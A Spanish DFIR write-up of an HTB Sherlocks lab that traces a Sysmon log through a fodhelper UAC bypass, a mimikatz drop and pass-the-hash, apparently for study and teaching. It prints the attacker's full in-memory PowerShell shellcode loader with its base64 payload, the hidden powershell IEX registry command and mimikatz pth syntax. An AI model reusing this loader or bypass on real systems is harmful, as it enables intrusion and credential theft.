
   - sysmon
   - windows
   - dfir
   - threat-hunting
   - incident-response
   - mitre-attack
   - uac-bypass
   - fodhelper
   - registry-forensics
   - process-tree-analysis
   - event-log-analysis
   - powershell
   - masquerading
   - shellcode
   - reflective-code-loading
   - credential-dumping
   - mimikatz
   - pass-the-hash
   - lateral-movement
   - indicator-removal
   - htb-sherlocks
   - log-analysis-jq
---

Para este lab se nos dan los siguientes ficheros:

```bash
```

El `.evtx` lo voy a parsear con `chainsaw` para analizar los logs con `jq`:

```bash
┌──(kali㉿kali)-[~/Documents/nueva_era_sherlocks/sysmon]
└─$ /opt/chainsaw/target/release/chainsaw dump --jsonl *.evtx > events_sysmon.jsonl

 ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗███████╗ █████╗ ██╗    ██╗
██╔════╝██║  ██║██╔══██╗██║████╗  ██║██╔════╝██╔══██╗██║    ██║
██║     ███████║███████║██║██╔██╗ ██║███████╗███████║██║ █╗ ██║
██║     ██╔══██║██╔══██║██║██║╚██╗██║╚════██║██╔══██║██║███╗██║
╚██████╗██║  ██║██║  ██║██║██║ ╚████║███████║██║  ██║╚███╔███╔╝
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚══╝╚══╝
    By WithSecure Countercept (@FranticTyping, @AlexKornitzer)

[+] Dumping the contents of forensic artefacts from: Sysmon.evtx (extensions: *)
[+] Loaded 1 forensic artefacts (1.1 MiB)
[+] Done
```

Con esto pasamos rápido a las preguntas.

---------------

Primero veamos los eventos que tenemos para este lab, asì nos daremos una guia visual de qué es lo que tenemos:

```bash
┌──(kali㉿kali)-[~/Documents/nueva_era_sherlocks/sysmon]
└─$ jq '.Event | .System.EventID' events_sysmon.jsonl | sort | uniq -c | sort -rn
    259 1
    248 11
    175 13
     40 22
     20 3
      6 5
      6 12
      3 8
```

El evento **8 (3) CreateRemoteThread** es una altísima señal, casi siempre inyección de procesos, esto ya nos da un buen punto de partida para empezar.

**1\. Which file gave access to the attacker?**

### Para empezar la investigación empezamos por revisar los eventos de más alta señal(**8, 3, 12**)

Con el `CreateRemoteThread (Event ID 8)`, un `StartModule` puede indicar código inyectado que no pertenece a ninguna DLL:

```bash
jq '.Event | select(.System.EventID == 8) | .EventData | {UtcTime, SourceImage, TargetImage, StartModule, StartFunction}' events_sysmon.jsonl | sort | uniq -c | sort -rn


```

Tenemos lo siguiente:

 #### `<unknown process>` → `CompatTelRunner.exe`, con `KERNELBASE.dll!CtrlRoutine` es el manejador del Ctrl+C de Windows:
     Cuando un proceso de Windows necesita ejecutar código, normalmente utiliza *threads*. Un proceso puede tener múltiples hilos de ejecución que comparten recursos, memoria y espacio de direcciones, por ejemplo:

     ```bash
     cmd.exe
     │
     ├── Thread 1: Ejecuta comandos
     ├── Thread 2: Gestiona entrada/salida
     └── Thread 3: Otras tareas
     ```

     Ahora bien, en windows existe una técnica llamada `CreateRemmoteThread`, que consiste crear un hilo de ejecución dentro del espacio de memoria de otro proceso.

     ```bash
     Proceso A (malware.exe)
            │
            │ CreateRemoteThread()
            ▼
     Proceso B (explorer.exe)
            │
            └── Nuevo hilo ejecutando código
    ```

    Esto puede usarse para ejecutar código dentro de procesos legítimos, ocultar la actividad de un malwarae, evadir técnicas de detección de malware, etc. **Por eso Sysmon genera el Event ID 8**.
    Pero este evento no significa que haya actividad maliciosa.

    Aquí entra el CTR+C, al ejecutar un comando en la terminal y después indicarle que detenga la ejecución con CTRL+C windows sabe qué hacer con dicha acción con el **Console Control Handler(SetConsoleCtrlHandler)**, que es el mecanismo para notificar a los procesos de consola qué hacer cuando occurren determinados eventos.
    Esto se maneja mediante la API  `SetConsoleCtrlHandler()`, que le dice a Windows qué funcioón ejecutar para esta acción.
    
    Ahora, en el campo `StartModule` nos indica el módulo (normalmente el ejecutable o DLL) al que pertenece la dirección inicial de ejecución del hilo. No indica necesaariamente dónde se inyectó el código, sino a qué módulo pertenece el punto donde comienz a ejecutarse el hilo. 
    En nuestro caso vemos a  `KERNELBASE.dll`, una biblioteca de Windows que contiene numerosas funciones API del sistema. En el campo `StartFunction` vemos a `CtrlRoutine`, la rutina relacionada con el manejo de eventos de control de consola como Ctrl+C, y vive dentro de `KERNELBASE.dll`.
    `CompatTelRunner.exe` es un ejecutable legítimo de Windows asociado a Microsoft Compatibility Telemetry. Participa en tareas de compatibilidad y diagnóstico del sistema, por ejemplo, recopilando información relacionada con aplicaciones y compatibilidad para actualizaciones.

### Qué es Cmder?:

    Cmder es un paquete de herramientas que proporciona una experiencia de terminal mejorada para Windows.
    Entre sus componentes se encuentra Clink, que mejora el `cmd.exe` tradicional, agregándole funcinalidades que normalmente asociamos con shells más avanzadas. Esto incluye autocompletado de comandos, historial de comandos mejoraado, navegación por el historiaal, integración de lua para personaalización. Clink busca mejorar esa experiencia sin remplazar cmd.exe

**Podemos concluir que se tratan pues de falsos positivos, ya que ambos se encuentran en rutas legítimmas del sistema**

### Ahora, revisando los eventos **Registry Events (Event IDs 12–14)**

```bash
jq '.Event | select(.System.EventID == 8) | .EventData | {UtcTime, SourceImage, TargetImage, StartModule, StartFunction}' events_sysmon.jsonl | sort | uniq -c | sort -rn

```

Tenemos:

- 4 de `LogonUI.exe` borrando `Keyboard layout\Preload\1`: ruido normal de la pantalla de inicio de sesión.
- `OneDriveSetup.exe` borrando su propia clave `Run\OneDriveSetup`. Tiene RuleName: T1060,RunKey, pero es el instalador de OneDrive limpiándose. La etiqueta salta por la ubicación, no por maldad.
- `C:\Users\Gabr\Desktop\IDM.exe` borrando `...\Classes\ms-settings\shell\open\command\DelegateExecute.`. Este es el importante.

Ahora tenemos que correlacionar los eventos, Esto lo hacemos con el `GUID` de `IDM.exe`:

```bash
# OBTENEMOS EL GUID:
guid=$(jq -r '.Event | select(.System.EventRecordID == 674) | .EventData.ProcessGuid' events_sysmon.jsonl)

# OBTENEMMOS TODOS LOS EVENTOS DE IDM.exe:
jq --arg g "$guid" 'select(.Event.EventData.ProcessGuid == $g)' events_sysmon.jsonl 

#OBTENEMOS LOS PROCESOS HIJOS DE IDM.exe:
jq --arg g "$guid" 'select(.Event.EventData.ParentProcessGuid == $g)' events_sysmon.jsonl
```

Con esto podemos segir la actividad de este evento sospechoso, y para confirmar la actividad maliciosa, usamoms el siguiente filtro para obtener toda su actividad:

```bash
#GUID="EDF674A6-F930-65F1-4C02-000000001200"
jq --arg g "$guid" 'select(.Event.EventData.ProcessGuid == $g)' events_sysmon.jsonl 

```

Esto ya nos dice cosas interesantes:
    - Se crea el proceso(EventID 1)
    - Hay una conexión de red(EventID 3)
    - Se dropea un archivo(EventID 11)
    - Se modifica el registro(EventID 13)
    - Una vez realizada la actividad maliciosa se procede a borrar evidencias(EventID 12)

Nuestro fichero es:

```bash
#guid="EDF674A6-F930-65F1-4C02-000000001200"

jq --arg g "$guid" 'select(.Event.EventData.ProcessGuid == $g and .System.EventID == 1) | "\(.EventData.Image)"' events_sysmon.jsonl 
```

La ubicación de IDM (Internet Download Manager) legítimo vive en C:\Program Files (x86)\Internet Download Manager\. 
Aquí está en el Desktop de un usuario, se trata de una técnica llamada  `masquerading`.

Es el único del grupo que toca una clave no relacionada con su función. Un gestor de descargas no tiene motivo para tocar ms-settings.

```bash

jq --arg g "$guid" 'select(.Event.EventData.ProcessGuid == $g and .System.EventID == 12) | .EventData | {EventType, Image, TargetObject}' events_sysmon.jsonl 

```

**La clave ms-settings\shell\open\command es la técnica clásica de bypass de UAC (T1548.002)**

------------------------

**2\. What did the attacker use to bypass UAC? Mention the EXE.**

### **Qué es la técnica T1548.002**?**

Windows tiene una lista de binarios que pueden auto-elevar sin mostrar el prompt de UAC(El recuadro que salta cuando quieres ejecutar algo con permisos de administrador), siempre que el usuario ya esté en el grupo de administradores(aunque corriendo con token de usuario estándar). Esto existe por comodidad: cosas como el Panel de control no deberían interrumpir constantemente.

`C:\Windows\System32\fodhelper.exe` es el *Features on Demand Helper*. Lo lanza windows cuando se entre a **Configuración -> Aplicaciones -> Características opcionales** para instalar o quitar componentes opcionales(idiomas, OpenSSH, RSAT, etc). Instalar esas cosas requiere permisos de administrador, así que el binario está diseñado para elevarse solo.

### **No lanza UAC por:** 

- Está firmado por Microsoft
- Está en un directorio de confianza
- Su manifest tiene `autoElevate=true`
- El UAC está en su nivel por defecto y el usuario es administrador(token dividido)

**Ahora, la relación con `ms-settings\shell\open\command`**

Al arrancar, fodhelper abre una URI `ms-settings:` mediante ShellExecute. Para saber qué ejecutar, el shell busca el handler de ese protocolo en `HKCR`, que es una vista combinada de `HKLM\Software\Classes` y `HKCU\Software\Classes` y **HKCU** tiene prioridad.

Así que tenemos el siguiente problema:

- Un proceso con integridad Medium puede escribir en HKCU sin elevarse.
- fodhelper ya corre elevado(High) y resuelve el handler desde el hive del usuario.
- Termina ejecutando lo que encuentra en `shell\open\command`, heredando el token elevado.

Esto resulta en ejecución con integridad alta sin pasar por el prompt. ATT&CK lo cataloga como T1548.002.

**¿Y `DelegateExecute`?** Si ese valor existe en la clave, el shell delega a un objeto COM e ignora el `(Default)`. Para que se use el comando del `(Default)`, el valor debe existir pero vacío. Por eso el log muestra `DelegateExecute = (Empty)` justo antes del `(Default)`.

Por lo que es `fodhelper.exe`, con sus permisos elevados, lo que da al atacante la posiblidad de heredar dichos permmisos en otro proceso.

---------------

**3\. What registry path and value was used by the above EXE to gain higher privileges? (path\value)**

Con los comandos anteriores ya vismos la secuencia de configuración en el **EventID 13**:

**Paso 1**

```txt
TargetObject: HKU\S-1-5-21-...-1001_Classes\ms-settings\shell\open\command\DelegateExecute
Details:      (Empty)
```

Habilita el modo de resolución delegada para este handler.

**Paso 2**

```bash
TargetObject: HKU\...\ms-settings\shell\open\command\(Default)
Details:      C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe -nop -w hidden -c "IEX (Get-ItemProperty -Path HKCU:\...\ms-settings\shell\open\command -Name sEpQhpkr).sEpQhpkr"
```

Setea el valor que `fodhelper.exe` **va a leer y ejecutar**. Apunta a `powershell.exe`.
El `sEpQhpkr` no contiene el payload, contiene una instrucción de lectura: *ve a esta misma clave de registro, lee la propiedad llamada `sEpQhpkr`y ejécutala con IEX(se usa generalmente para ejecutar cosas directamente en memoria, sin escribir en disco)

**Paso 3, y el más interesante**

```bash
TargetObject: HKU\...\ms-settings\shell\open\command\sEpQhpkr
Details:      [payload de PowerShell — shellcode loader]
```

Deja el payload real escondido en una propiedad separada, para que el `(Default)`(paso 2) se mantenga en corto y no levante sospechas en el `CommandLine` del proceso hijo.
Lo que se configura aquí es un shellcode:

```c
"Details": "Set-StrictMode -Version 2\r\n$cYpe7 = @\"\r\n\tusing System;\r\n\tusing System.Runtime.InteropServices;\r\n\tnamespace iu93a {\r\n\t\tpublic class func {\r\n\t\t\t[Flags] public enum AllocationType { Commit = 0x1000, Reserve = 0x2000 }\r\n\t\t\t[Flags] public enum MemoryProtection { ReadWrite = 0x04, Execute= 0x10 }\r\n\t\t\t[Flags] public enum Time : uint { Infinite = 0xFFFFFFFF }\r\n\t\t\t[DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\r\n\t\t\t[DllImport(\"kernel32.dll\")] public static extern bool VirtualProtect(IntPtr lpAddress, int dwSize, int flNewProtect,out int lpflOldProtect);\r\n\t\t\t[DllImport(\"kernel32.dll\")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\r\n\t\t\t[DllImport(\"kernel32.dll\")] public static extern int WaitForSingleObject(IntPtr hHandle, Time dwMilliseconds);\r\n\t\t}\r\n\t}\r\n\"@\r\n\r\n$i2 = New-Object Microsoft.CSharp.CSharpCodeProvider\r\n$mN = New-Object System.CodeDom.Compiler.CompilerParameters\r\n$mN.ReferencedAssemblies.AddRange(@(\"System.dll\", [PsObject].Assembly.Location))\r\n$mN.GenerateInMemory = $True\r\n$rLMf = $i2.CompileAssemblyFromSource($mN, $cYpe7)\r\n\r\n[Byte[]]$vI = [System.Convert]::FromBase64String(\"/OiPAAAAYDHSieVki1Iwi1IMi1IUMf+LcigPt0omMcCsPGF8Aiwgwc8NAcdJde9SV4tSEItCPAHQi0B4hcB0TAHQi0gYi1ggAdNQhcl0PEkx/4s0iwHWMcDBzw2sAcc44HX0A334O30kdeBYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS6YD///9daDMyAABod3MyX1RoTHcmB4no/9C4kAEAACnEVFBoKYBrAP/VagpoCgAACmgCAAG7ieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQM/04Idexo8LWiVv/VagBqBFZXaALZyF//1Ys2akBoABAAAFZqAGhYpFPl/9WTU2oAVlNXaALZyF//1QHDKcZ17sM=\")\r\n[Uint32]$rw6m5 = 0\r\n\r\n$qyJ4 = [iu93a.func]::VirtualAlloc(0, $vI.Length + 1, [iu93a.func+AllocationType]::Reserve -bOr [iu93a.func+AllocationType]::Commit, [iu93a.func+MemoryProtection]::ReadWrite)\r\nif ([Bool]!$qyJ4) { $global:result = 3; return }\r\n[System.Runtime.InteropServices.Marshal]::Copy($vI, 0, $qyJ4, $vI.Length)\r\n\r\nif ([iu93a.func]::VirtualProtect($qyJ4,[Uint32]$vI.Length + 1, [iu93a.func+MemoryProtection]::Execute, [Ref]$rw6m5) -eq $true ) {\r\n\t[IntPtr] $lSfD = [iu93a.func]::CreateThread(0,0,$qyJ4,0,0,0)\r\n\tif ([Bool]!$lSfD) { $global:result = 7; return }\r\n\t$phNyL = [iu93a.func]::WaitForSingleObject($lSfD, [iu93a.func+Time]::Infinite)\r\n}",
```

Separando:

```bash
[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(...)
[DllImport("kernel32.dll")] public static extern bool VirtualProtect(...)
[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(...)
```

El script usa `CSharpCodeProvider` para compilar en memoria una clase C# que hace `P/Invoke` a tres funciones de `kernel32.dll`. Esas tres funciones juntas son la firma clásica de un loader de shellcode:

- `VirtualAlloc(..., MemoryProtection.ReadWrite)` → reserva una región de memoria con permiso de escritura.
- `Marshal.Copy($vI, 0, $qyJ4, $vI.Length)` → copia ahí el contenido de `$vI`, que es:

    ```powershell
    [Byte[]]$vI = [System.Convert]::FromBase64String("/OiPAAAAYDHSieVki1Iw...")
    ```

    Un array de bytes crudos decodificado de base64. No es un `.exe`, no es un script, no tiene cabecera PE ni extensión, es simplemente una secuencia de bytes.

- `VirtualProtect(..., MemoryProtection.Execute)` → cambia el permiso de esa misma región de escritura a ejecución.
- CreateThread(0, 0, $qyJ4, ...) → crea un hilo cuyo punto de entrada (lpStartAddress) es la dirección de memoria donde están esos bytes — no llama a una función, salta directo a ejecutar esos bytes como instrucciones de CPU.

Esa secuencia,  **asignar memoria RW → copiar bytes → cambiar a RX → crear un hilo apuntando ahí** es, por definición, cómo se ejecuta shellcode: código máquina independiente de posición, sin empaquetar en un ejecutable, que corre saltando la ejecución directamente a una dirección de memoria.

El patrón completo termina siendo -> `CSharpCodeProvider` compilando P/Invoke sobre la marcha para evitar escribir cmdlets detectables tipo `Add-Type` directo, con nombres de variable aleatorios (`$cYpe7`, `$qyJ4`, `$rLMf`).

**Con lo que nuestra respuesta es `HKCU:\Software\Classes\ms-settings\shell\open\command\sEpQhpkr`.**

-------

**4\. The attacker dropped a file. What is the file location?**

Ya lo vimos con los comandos anteriores, en el `EventID 11`:

```jsonl
      "EventID": 11,
    "EventData": {
      "RuleName": "Downloads",
      "UtcTime": "2024-03-13 19:06:49.733",
      "ProcessGuid": "EDF674A6-F930-65F1-4C02-000000001200",
      "ProcessId": 1656,
      "Image": "C:\\Users\\Gabr\\Desktop\\IDM.exe",
      "TargetFilename": "C:\\Users\\Gabr\\Downloads\\mimikatz.exe",
```

------------

**5\. What are the technique name and ID used by the dropped EXE?**

**Mimikatz** es usado en entornos windows para `Credential Dumping`, mapeada por MITRE como la `T1003`.

-----------------

**6\. What is the name of the attack?**

El diseño de `mimikatz` tiene varias fases integrada, en este caso:

- sekurlsa::logonpasswords → extrae el hash NTLM de la memoria de LSASS (esto es T1003.001)
- sekurlsa::pth /user:X /domain:Y /ntlm:<hash> → inyecta ese hash en una nueva sesión de logon y lanza un proceso que "es" ese usuario ante cualquier servicio que autentique por NTLM, todo sin haber visto nunca la contraseña en texto plano

Estamos hablando de un ataque **Pass The Hash**

---------

**7\. What EXE did the attacker run using elevated privileges from the above attack?**

Como ya vimos anteriormente, se configura powershell para ejecutar el shellcode:

```bash
 C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe -nop -w hidden -c "IEX (Get-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name sEpQhpkr).sEpQhpkr"
```

--------------------

**8\. The attacker downloaded and ran a file. What is the filename?**

Filtramos por fichero creados después de los eventos ya registrados:

```bash
jq '.Event | select(.System.EventID == 11 and .System.TimeCreated_attributes.SystemTime > "2024-03-13T19:09:12") | "\(.System.EventID) \(.EventData.TargetFilename) \(.EventData.User)"' events_sysmon.jsonl 
```

